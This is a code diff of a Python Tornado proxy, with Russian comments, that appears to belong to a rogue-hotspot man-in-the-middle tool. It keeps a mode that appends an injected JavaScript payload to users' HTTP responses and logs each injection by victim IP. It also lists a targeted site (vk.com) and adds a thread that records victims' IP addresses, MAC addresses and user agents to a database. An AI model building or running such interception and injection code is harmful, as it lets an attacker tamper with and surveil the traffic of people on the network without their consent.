@@ -4,15 +4,19 @@ import tornado.httpserver
 import tornado.httpclient
 import tornado.iostream
 import tornado.httputil
+import threading
+import time
 import sys
 import os, platform, logging
 import socket
 import argparse
 from urllib.parse import urlparse
 from ourlogging import Logging
+from adminka.adminka.source_code.logging import Logging
+from adminka.adminka.source_code.clientAndHotspot import Client, Hotspot
 
 # Список атакуемых сайтов
-list_target_hosts = ['vk.com', ]
+#list_target_hosts = ['vk.com', ]
 
 
 # Создание файлаов лога
@@ -27,6 +31,9 @@ else:
 
 # Этот лог моего формата, пусть останется пока что
 print("Сохраняем лог в ", logging_file)
+
+# Словарь для создания буфера записи лога и обновлений строк User-Agent в БД
+dic_ip_user_agent = {}
 
 # Настройка лог файла
 logging.basicConfig(
@@ -82,9 +89,11 @@ class ProxyHandler(tornado.web.RequestHandler):
     @tornado.web.asynchronous
     def get(self):
 
-        #Сбор статистики в лог файл
-        msg_log = self.request.remote_ip + ' : ' + self.request.headers['User-Agent']
-        logging_output.write_log('СТАТИСТИКА', msg_log)
+        # Сбор статистики в лог файл
+        # msg_log = self.request.remote_ip + ' : ' + self.request.headers['User-Agent']
+        # logging_output.write_log('СТАТИСТИКА', msg_log)
+        # global dic_ip_user_agent
+        # dic_ip_user_agent = {str(self.request.remote_ip): self.request.headers['User-Agent']}
 
         logging.info('Handle %s request to %s', self.request.method,\
                      self.request.uri)
@@ -106,7 +115,7 @@ class ProxyHandler(tornado.web.RequestHandler):
                 if (response.body and self.mode == 'jsinj'):
                     self.set_header('Content-Length', len(response.body) + len(self.jscript))
                     self.write(response.body + self.jscript)
-                    #Отчет о внедрении JavaScript
+                    # Отчет о внедрении JavaScript
                     logging_output.write_log('JS INJECTED', 'Пользователю с IP: ' + self.request.remote_ip + 'JS внедрен')
                     logging.info("Body response: {}".format(response.body))
                 elif response.body:
@@ -202,11 +211,39 @@ class ProxyHandler(tornado.web.RequestHandler):
             upstream.connect((host, int(port)), start_tunnel)
 
 
+class LoggingProxyServer(threading.Thread):
+
+    """Класс для логирования действий ProxyServer и записей в БД.
+            Параметры: - interval - время обновления буфера и записи информации в БД."""
+
+    def __init__(self, interval):
+        threading.Thread.__init__(self)
+        self.daemon = True
+        self.interval = interval
+
+    @staticmethod
+    def checkout_info():
+        global dic_ip_user_agent
+        for ip, user_agent in dic_ip_user_agent.items():
+            mac = Client.get_mac_for_ip(ip)
+            Client.update_user_agent(user_agent, mac)
+            msg_log = ip + ' : ' + user_agent
+            logging_output.write_log('СТАТИСТИКА', msg_log)
+        dic_ip_user_agent.clear()
+
+    def run(self):
+        while True:
+            time.sleep(self.interval)
+            self.checkout_info()
+
+
 def run_proxy(port, mode=None, jscript=None, start_ioloop=True):
-    """
-    Run proxy on the specified port. If start_ioloop is True (default),
-    the tornado IOLoop will be started .immediately
-    """
+    """ Запуск прокси-сервера на специальном порту, по умолчанию port=8080 """
+
+    # Запуск логирования и записи в БД. Все считывается с глобальной переменной dic_ip_user_agent
+    log = LoggingProxyServer(45)
+    log.run()
+
     payload_js = None
     try:
         if len(sys.argv) < 2:
